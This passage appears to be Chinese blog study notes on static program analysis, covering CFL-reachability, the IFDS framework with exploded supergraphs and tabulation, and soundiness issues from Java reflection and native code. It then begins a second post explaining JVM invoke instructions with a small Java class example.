<ol>
<li><p>有的调用图有多个main入口方法，咋办？</p>
<p>将多个入口函数都加入到EntryMethod(m)即可。</p>
</li>
<li><p>有没有datalog和传统结合的做法</p>
<p>如chord（java+Datalog实现）</p>
</li>
</ol>
<h1 id="15"><a href="#15" class="headerlink" title="15"></a>15</h1><p><strong>目标</strong>：以<strong>图可达性分析</strong>来进行程序分析，没有了数据流传播的过程。</p>
<h2 id="Infeasible-and-Realizable-Paths——基本概念"><a href="#Infeasible-and-Realizable-Paths——基本概念" class="headerlink" title="Infeasible and Realizable Paths——基本概念"></a>Infeasible and Realizable Paths——基本概念</h2><p><strong>Infeasible Paths</strong>：<strong>CFG中存在，但是实际动态运行中不会执行到的路径</strong>，如不匹配的调用返回边。这种路径可能会影响到程序分析的结果，但静态分析不能<strong>完全</strong>判定路径是否可达，会造成误报。</p>
<p>也就是说，如果CG上存在假边，那么静态分析时，dataflow会绕着假边来流动，造成误报。我们希望假边尽可能少，误报也就尽可能少。</p>
<p><strong>Realizable Paths</strong>：跨函数调用产生的return边和对应的call-site的call边匹配，这样的path。它可能不会被执行</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200827213547440.png" alt="image-20200827213547440"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200828104139957.png" alt="image-20200828104139957"></p>
<p><strong>目标</strong>：识别<code>Realizable path</code>，避免沿着<code>Unrealizable path</code>来传播数据分析。沿着对儿来匹配，从1来回到1，从2来回到2。</p>
<p><strong>方法</strong>：<code>CFL-Reachablity</code>。</p>
<h2 id="CFL-Reachablity（IFDS的理论基础，识别Realizable-path）"><a href="#CFL-Reachablity（IFDS的理论基础，识别Realizable-path）" class="headerlink" title="CFL-Reachablity（IFDS的理论基础，识别Realizable path）"></a>CFL-Reachablity（IFDS的理论基础，识别Realizable path）</h2><p><strong>CFL-Reachablity</strong>：path连接A和B，或者说A能到达B，当且仅当path所有边的labels连接起来 是<code>context-free language</code>（CFL）中的一个word（或者说经过CFG语法变换之后可以得到该<code>path word</code>）。CFL是编译原理中的概念，遵循CFG语法。</p>
<p>简单来说：在边上添加label，那么一个路径realizable即这个路径上的边label组成了一个word，这个word是符合定义的上下文无关文法（CFG）的。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200828105754052.png" alt="image-20200828105754052"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200828105808896.png" alt="image-20200828105808896"></p>
<p>理解：</p>
<p>S可以无条件滴替换为asb，也可以无条件地替换ɛ。</p>
<p><strong>部分括号匹配问题（Partially Balanced-Parenthesis）</strong>：利用CFL来解决括号匹配问题，以识别<code>Realizable path</code>。</p>
<ul>
<li>部分——有<code>)i</code>一定要有<code>(i</code>，反之有<code>(i</code>不一定要有<code>)i</code>，也即可以调用子函数而不返回。</li>
<li>对于每个调用点i，将其调用边加 <code>(i</code> 的标签，将其返回边加 <code>)i</code>的标签；</li>
<li>标记，调用边——<code>(i</code>；返回边——<code>)i</code>；其他边——e。</li>
</ul>
<p><strong>CFL-Reachablity</strong>：若path word（所有edge的label连起来组成的单词）可用CFL L(realizable)表示（可进行各种替换），则为<code>Realizable Path</code>。</p>
<p>示例如下，(1(2e)2)1(3就是边的label相连接形成的，绿色是可匹配的部分，<code>realizable</code>可被替换为<code>matched realizable</code>、<code>(i realizable</code>、ɛ。语法替换规则如下，这也是一个CFL语言示例：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200828111138550.png" alt="image-20200828111138550"></p>
<p>示例：</p>
<p>看边就行了</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200828122836984.png" alt="image-20200828122836984"></p>
<h2 id="IFDS"><a href="#IFDS" class="headerlink" title="IFDS"></a>IFDS</h2><p><strong>IFDS含义</strong>：</p>
<p>Interprocedural，Finite，Distributive，Subset   - Problem</p>
<p>Interprocedural—全程序分析</p>
<p>Finite—域有限（如live variables、definitions）</p>
<p><strong>Distributive</strong>—<code>Transfer Function</code>满足f(aub)=f(a)uf(b)</p>
<p>Subset—子集问题</p>
<p><strong>利用图可达性的程序分析框架</strong>：采用的操作——Meet-Over-All-Realizable-Paths（MRP），MRPn比MOPn更加精确，范围更小。</p>
<p>MOP对所有路径进行meet操作，MRP只对<code>realizable path</code>进行meet操作，更准确。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200828163341454.png" alt="image-20200828163341454"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200828163422557.png" alt="image-20200828163422557"></p>
<h2 id="Supergraph（之前叫iCFG）-amp-Flow-Functions"><a href="#Supergraph（之前叫iCFG）-amp-Flow-Functions" class="headerlink" title="Supergraph（之前叫iCFG）&amp; Flow Functions"></a>Supergraph（之前叫iCFG）&amp; Flow Functions</h2><h3 id="IFDS步骤一：构造Supergraph"><a href="#IFDS步骤一：构造Supergraph" class="headerlink" title="IFDS步骤一：构造Supergraph"></a>IFDS步骤一：构造Supergraph</h3><p><strong>说明</strong>：之前叫iCFG，给每个<strong>node</strong>定义<code>transfer function</code>；现在叫做Supergraph，给每个<strong>edge</strong>定义<code>transfer function</code>。</p>
<p><strong>Supergraph</strong>：G<em>=(N</em>, E*)。</p>
<ul>
<li>G*包含所有的流图G1, G2, … （每个函数对应一个流图，本例对应Gmain和Gp）；</li>
<li>每个流图Gp都有个开始节点sp和退出节点ep；</li>
<li>每个<strong>函数调用</strong>包含调用节点Callp 和 返回节点Retp。</li>
<li>函数调用有3类边：<ul>
<li>过程内<code>call-to-return-site</code>边，从Callp→Retp；</li>
<li>过程间<code>call-to-start</code>边，从Callp→sp（sp是被调用函数的开头）；</li>
<li>过程间<code>exit-to-return-site</code>边，从ep→Retp（ep是被调用函数的结尾）。</li>
</ul>
</li>
</ul>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200828170124984.png" alt="image-20200828170124984"></p>
<h3 id="IFDS步骤一：设计流函数-flow-functions"><a href="#IFDS步骤一：设计流函数-flow-functions" class="headerlink" title="IFDS步骤一：设计流函数 flow functions"></a>IFDS步骤一：设计流函数 flow functions</h3><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200828171430697.png" alt="image-20200828171430697"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200828173236760.png" alt="image-20200828173236760"></p>
<p><strong>示例</strong>：</p>
<ul>
<li><code>call-to-callee</code>把与callee直接相关信息传递进去，如用形参替换实参；</li>
<li><code>exit-to-return</code>边把形参相关信息剔除；</li>
<li><code>call-to-return-site</code>只传递局部变量，排除全局变量g，降低误报。全局变量已经传入到被调用函数进行处理了，全局变量是否被初始化取决于被调用函数。</li>
</ul>
<p>例子:</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200829111141207.png" alt="image-20200829111141207"></p>
<h2 id="Exploded-Supergraph-and-Tabulation-Algorithm"><a href="#Exploded-Supergraph-and-Tabulation-Algorithm" class="headerlink" title="Exploded Supergraph and Tabulation Algorithm"></a>Exploded Supergraph and Tabulation Algorithm</h2><h3 id="IFDS步骤二：构造exploded-supergraph-G"><a href="#IFDS步骤二：构造exploded-supergraph-G" class="headerlink" title="IFDS步骤二：构造exploded supergraph G#"></a>IFDS步骤二：构造<code>exploded supergraph</code> G#</h3><p><strong><code>Exploded Supergraph</code>G#</strong>：将<code>trans func</code>转换成边的关系<code>representation relations</code>（graph），每个流函数变成了有<code>2(D+1)</code>个节点，边数最多(D+1)2，D表示<code>dataflow facts</code>元素个数（如待分析的变量个数）。G*中每个结点n被分解成<code>D+1</code>个结点，每条边n1→n2被分解成<code>representation relation</code>。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200829111247813.png" alt="image-20200829111247813"></p>
<p><strong>示例</strong>：</p>
<ul>
<li>（1）输入S是什么输出就是什么，1/3；</li>
<li>（2）无论什么输入，都输出{a}，1/2；</li>
<li>（3）b是无条件产生，所以0→b，a不能往下传了，b已经从0可达了就不用加b→b，c不受影响，也即无论有关a和b的事实之前是什么样，都不再重要；</li>
<li>（4）b通过a得到所以a→b，不影响a、c的传递。注意，这里的值不是说变量在程序中真正的值是多少，而是说有关此变量的数据流事实的值是什么，如a的值可以为<strong>被初始化了</strong>和<strong>未被初始化</strong>两种，对应的集合即不包括和包括a。</li>
</ul>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200829114338794.png" alt="image-20200829114338794"></p>
<p><strong>问题</strong>：为什么需要0→0的边？以往数据流分析中，确定程序点（结点）p是否包含data fact a，是看a是否在OUT[p]中；IFDS中，是看&lt;s<sub>main</sub>, 0&gt;是否能到达&lt;p, a&gt;。如果没有0→0的边，则无法完全连通，所以0→0又称为<code>Glue Edge</code>。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200829121022899.png" alt="image-20200829121022899"></p>
<p><strong>构建G#示例</strong>：最后能从&lt;s<sub>main</sub>, 0&gt;→&lt;e<sub>main</sub>, g&gt;（要通过<code>realizable paths</code>），则e<sub>main</sub>点的g是可能未初始化的。emain处的x和n<sub>Print(a,g)</sub>处的g都是初始化过的，因为从s<sub>main</sub>不可达（不能通过<code>non-realizable paths</code>——绿色线）。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200829121859408.png" alt="image-20200829121859408"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200829122128987.png" alt="image-20200829122128987"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200829122249017.png" alt="image-20200829122249017"></p>
<p>不可达原因：括号没匹配上</p>
<h3 id="IFDS步骤三：Tabulation算法——判断是否可达"><a href="#IFDS步骤三：Tabulation算法——判断是否可达" class="headerlink" title="IFDS步骤三：Tabulation算法——判断是否可达"></a>IFDS步骤三：Tabulation算法——判断是否可达</h3><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200829122648056.png" alt="image-20200829122648056"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/6349402-5043f4907cd15c10-20200829215452471.png" alt="img"></p>
<p><strong>Tabulation算法工作原理</strong>：假设只关注1个data fact，p’被p和p’’同时调用。</p>
<ul>
<li>处理括号匹配：每次处理到返回点ep’时，开始括号匹配（<code>call-to-return</code>匹配），找到调用点(Callp， Callp’’)和相应的返回点(Retp，Retp’’)。</li>
<li>处理总结边——SummaryEdge：总结边—&lt;Call,dm&gt;→&lt;Ret,dn&gt;，表示dm通过调用p’能到达pn，要避免重复处理p和p’’中调用同一函数p’（优化）。</li>
</ul>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/6349402-1f2401da0b53aa3a.png" alt="img"></p>
<p><strong>Tabulation算法优点</strong>：传统的worklist算法是利用了queue的特性，每次循环只考虑与被改变值结点的相关结点。论文中用于解决图可达问题的Tabulation 算法是基于worklist的动态规划算法，比传统worklist算法考虑interprocedure问题更精确也更省时。</p>
<h2 id="Understanding-the-Distributivity-of-IFDS"><a href="#Understanding-the-Distributivity-of-IFDS" class="headerlink" title="Understanding the Distributivity of IFDS"></a>Understanding the Distributivity of IFDS</h2><p><strong>结论</strong>：<strong>不能用IFDS进行常量传播分析、指针分析</strong>。</p>
<p><strong>原因</strong>：<strong>由IFDS的框架决定，一次只能处理1个变量</strong>。例如，表示若x和y都存在则会冲突，无法表示这种关系。不满足<code>F(x^y)=F(x)^F(y)</code>。</p>
<p><strong>总结</strong>：<strong>给定语句S，如果输出取决于多个输入的<code>data fact</code>，则该分析不具备可分配性，不能用IFDS表达</strong>。IFDS中，每个<code>data fact</code>（圆圈）与其传播（边）都可以各自处理，且不影响最终结果。</p>
<p><strong>IDE</strong>：IDE（Interprocedural，Distributive，Environment problem）作为IFDS的优化，可以解决infinite的问题，但是仍需满足distributive。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200829213817200.png" alt="image-20200829213817200"></p>
<p><strong>指针分析</strong>：箭头表示变量是否指向<code>new T</code>，但由于缺乏别名信息<code>alias(x,y)</code> / <code>alias(x.f,y.f)</code>，导致分析结果错误。也就是说正常应该有一个红色的虚线边，但是由于缺少了别名分析，导致分析错误。</p>
<p>归根结底，要想在IFDS中获取别名信息<code>alias(x,y)</code>，需要考虑多个输入<code>data fact</code>（x、y），所以不能用IFDS。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200829215602083.png" alt="image-20200829215602083"></p>
<h1 id="16"><a href="#16" class="headerlink" title="16"></a>16</h1><h2 id="Soundness-amp-Soundiness"><a href="#Soundness-amp-Soundiness" class="headerlink" title="Soundness &amp; Soundiness"></a>Soundness &amp; Soundiness</h2><p>分析真实复杂程序时，产生的问题都与Soundiness有关，是最前沿的topic之一。</p>
<p><strong>Soundness</strong>：保守估计，分析结果能<strong>包含程序所有可能的执行</strong>，<strong>OVER</strong>。学术界和工业界都做不到。</p>
<p><strong>复杂语言特性</strong>：导致分析结果不精确。</p>
<ul>
<li>Java：Reflection, native code, dynamic class loading, etc.</li>
<li>JavaScript：eval（执行任意命令）, document object model (DOM，和DOM加护), etc.</li>
<li>C/C++：Pointer arithmetic（指针地址加或乘操作）, function pointers, etc.</li>
</ul>
<p><strong>现状</strong>：有些文章不提这类问题，或者随意一提（如eval）。极具误导性，导致相信该工具很sound，且影响专家的评判。</p>
<p><strong>Soundiness</strong>：直观相信的”truth”，但没有任何事实和证据。</p>
<p><strong>sound analysis</strong>：分析大部分都是sound的，并且对于hard-to-analysis部分来说，明确说出来是怎么处理的。</p>
<p><strong>词语对比</strong>：</p>
<ul>
<li>sound analysis：能捕捉所有动态运行行为，纯理想化分析。</li>
<li>soundy analysis：目标是捕捉所有动态行为，但对于某些复杂语言特性可以unsound。</li>
<li>unsound analysis：为了效率、精度，故意不处理某些行为。</li>
</ul>
<h2 id="复杂语言特性一：Java-Reflection—反射"><a href="#复杂语言特性一：Java-Reflection—反射" class="headerlink" title="复杂语言特性一：Java Reflection—反射"></a>复杂语言特性一：Java Reflection—反射</h2><h3 id="什么是Java反射"><a href="#什么是Java反射" class="headerlink" title="什么是Java反射"></a>什么是Java反射</h3><p><strong>Java Reflection</strong>：反射机制很重要的一点就是“运行时”，其使得我们可以在程序运行时加载、探索以及使用编译期间完全未知的 <code>.class</code> 文件。换句话说，Java 程序可以加载一个运行时才得知名称的 <code>.class</code> 文件，然后获悉其完整构造，并生成其对象实体、或对其 fields（变量）设值、或调用其 methods（方法）。</p>
<p><strong>三个MetaObject</strong>：</p>
<p>Class-class，Method-method，Field-field分别对应。</p>
<p>反射世界虽然复杂，但是离不开第一步入口：获取Class对象。</p>
<p><strong>说明</strong>：非反射代码在编译时就能确定对象；反射代码在运行时才确定对象，如c指向什么，”Person”也可能是的字符串指针，很难静态分析。分析该类代码很有必要，如弄清对象到底调用了哪个目标函数、对象域的指向关系等。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200830164532751.png" alt="image-20200830164532751"></p>
<h3 id="分析方法"><a href="#分析方法" class="headerlink" title="分析方法"></a>分析方法</h3><p><strong>分析方法</strong>：String Contant analysis + Pointer Analysis（Reflection Analysis for Java——APLAS 2005）。</p>
<p><strong>示例</strong>：目标是分析m调用的目标函数。</p>
<ul>
<li>找到m的定义点，即<code>Method m = c.getMethod(mName, ...);</code></li>
<li>通过<code>String Contant analysis</code>找到<code>mName</code>指向内容</li>
<li>通过指针分析找到c指向内容</li>
<li>通过<code>String Contant analysis</code>找到<code>cName</code>指向内容</li>
<li>知道了是调用<code>Person</code>类的<code>setName</code>函数</li>
</ul>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200830165227825.png" alt="image-20200830165227825"></p>
<p><strong>问题</strong>：<strong>若字符串的值无法通过静态分析得到，则反射目标不能求解</strong>。Eg，字符串来自配置文件、网络、命令行、复杂字符串处理、动态生成、加密。</p>
<h3 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h3><p><strong>解决方法</strong>：Type Inference + String analysis + Pointer Analysis（<a href="https://yuleisui.github.io/publications/ecoop14.pdf" target="_blank" rel="noopener">Self-Inferencing Reflection Resolution for Java</a>——ECOOP 2014，李樾，谭添老师的成果）。</p>
<p><strong>在创造点不可推，但在使用点可推</strong>。</p>
<p><strong>示例</strong>：【搜集隐藏线索】类名依赖cmd参数，解不出来；但在调用点，通过Java的类型系统推导<code>parameters</code>，发现<code>parameters</code>是this指针。</p>
<p>推出结论就是，175行的目标函数肯定有1个参数，且这个参数的声明类型要么是<code>FrameworkCommandInterpreter</code>要么是其子类。</p>
<p>结果推断出50个反射目标函数，48个为true。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200830171109282.png" alt="image-20200830171109282"></p>
<p><strong>最新工作</strong>：<a href="https://yuelee.bitbucket.io/papers/tosem19.pdf" target="_blank" rel="noopener">Understanding and Analyzing Java Reflection</a> (TOSEM 2019) <em>Yue Li, Tian Tan, Jingling Xue</em>。不仅求解反射对象更准确更多，而且能说出哪里解的不准。</p>
<p><strong>常用方法</strong>：<a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.445.5090&rep=rep1&type=pdf" target="_blank" rel="noopener">Taming reflection: Aiding static analysis in the presence of reflection and custom class loaders</a> (ICSE 2011)。利用动态分析来解，缺点是测试用例的覆盖路径有限，优点是只要解出来，结果都为真。</p>
<h2 id="复杂语言特性二：Native-Code"><a href="#复杂语言特性二：Native-Code" class="headerlink" title="复杂语言特性二：Native Code"></a>复杂语言特性二：Native Code</h2><p><strong>Native Code</strong>：一个Native Method就是一个java调用非java代码的接口。该方法的实现由非java语言实现，已被编译为特定于处理器的机器码的代码，这些代码可以直接被虚拟机执行，与字节码的区别：虚拟机是一个把通用字节码转换成用于特定处理器的本地代码的程序，比如C。这个特征并非java所特有，很多其它的编程语言都有这一机制，比如在C++中，你可以用extern “C”告知C++编译器去调用一个C的函数。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200830172333870.png" alt="image-20200830172333870"></p>
<p><strong>Java Native Interface(JNI)</strong>：是一种编程框架（函数模型，反映参数格式等），使得Java虚拟机中的Java程序可以调用本地应用/或库，也可以被其他程序调用。 本地程序一般是用其它语言（C、C++或汇编语言等）编写的，并且被编译为基于本机硬件和操作系统的程序。</p>
<p>也就是说，Java应用或者Lib包都是class文件，可以通过JVM内部的JNI接口与Native App&amp;Lib原生来交互。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200830205416161.png" alt="image-20200830205416161"></p>
<p><strong>示例</strong>：先加载Native库，声明Native函数，<code>*env</code>变量可以在Native代码中用于创建对象、访问域、调用Java中的方法等，支持230个JNI函数。<strong>问题是跨语言之后，如何静态分析<code>je.guessMe()</code>这个调用？</strong></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200830211838150.png" alt="image-20200830211838150"></p>
<p><strong>方法</strong>：对重要的<code>native code</code><strong>手动建模</strong>。例如，对经常调用的<code>arraycopy()</code>函数进行建模，建模后就是一个拷贝循环，但从指针分析角度来讲，看到这个循环，我们就把数组指针进行传递。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200830214334563.png" alt="image-20200830214334563"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jianshu.com/u/a12c5b882be2" target="_blank" rel="noopener">1</a></p>
]]></content>
      <categories>
        <category>静态分析</category>
      </categories>
      <tags>
        <tag>静态分析基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Java方法调用</title>
    <url>/Java%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>返景入深林，复照青苔上。</p>
</blockquote>
<p>前一阵分析Jimple文件，看到好多种invoke语句，今天来复习一下。</p>
<a id="more"></a>

<h1 id="两种链接"><a href="#两种链接" class="headerlink" title="两种链接"></a>两种链接</h1><h2 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h2><p>当一个class文件被装进JVM内部时，如果被调用的目标方法在编译期可知，且运行时保持不变。</p>
<h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><p>如果调用的方法在编译器无法确定下来，只能在运行期间确定下来（重写/多态/继承）。</p>
<h1 id="两种方法"><a href="#两种方法" class="headerlink" title="两种方法"></a>两种方法</h1><h2 id="非虚方法"><a href="#非虚方法" class="headerlink" title="非虚方法"></a>非虚方法</h2><p>静态方法<code>static</code>，私有方法<code>private</code>，<code>final</code>方法，构造器<code>&lt;init&gt;</code>，父类方法<code>super.xx()</code></p>
<h2 id="虚方法"><a href="#虚方法" class="headerlink" title="虚方法"></a>虚方法</h2><p>多态，重写，重载。</p>
<h1 id="五种invoke"><a href="#五种invoke" class="headerlink" title="五种invoke"></a>五种invoke</h1><h2 id="invokestatic"><a href="#invokestatic" class="headerlink" title="invokestatic"></a>invokestatic</h2><p>调用静态方法<code>static</code>，解析阶段唯一确定方法的版本。</p>
<h2 id="invokespecial"><a href="#invokespecial" class="headerlink" title="invokespecial"></a>invokespecial</h2><p>调用促使构造器方法<code>&lt;init&gt;</code>，私有方法<code>private</code>，父类方法<code>super.xx()</code>。</p>
<p>解析阶段确定唯一方法的版本。</p>
<h2 id="invokevirtual"><a href="#invokevirtual" class="headerlink" title="invokevirtual"></a>invokevirtual</h2><p>虚方法，以及<code>final</code>方法。</p>
<h2 id="invokeinterface"><a href="#invokeinterface" class="headerlink" title="invokeinterface"></a>invokeinterface</h2><p>调用xx接口</p>
<h2 id="invokedynamic"><a href="#invokedynamic" class="headerlink" title="invokedynamic"></a>invokedynamic</h2><p>动态解析出需要调用的方法，然后执行。</p>
<p>lambda表达式。</p>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ol>
<li>非虚方法：invokestatic，invokespecial</li>
<li>虚方法：invokevirtual，invokedynamic</li>
<li>特殊说明：<code>final</code>方法其实很特殊，他是唯一一个invokevirtual，却仍然是非虚方法。</li>
<li>invokedynamic主要还是应用于lambda表达式，比较少见</li>
</ol>
<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>父类Father：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Father</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Father init method."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">showStatic</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Father static method."</span>+str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">showFinal</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Father final method."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">showCommon</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Father common method."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>子类Son继承了Father父类：</p>
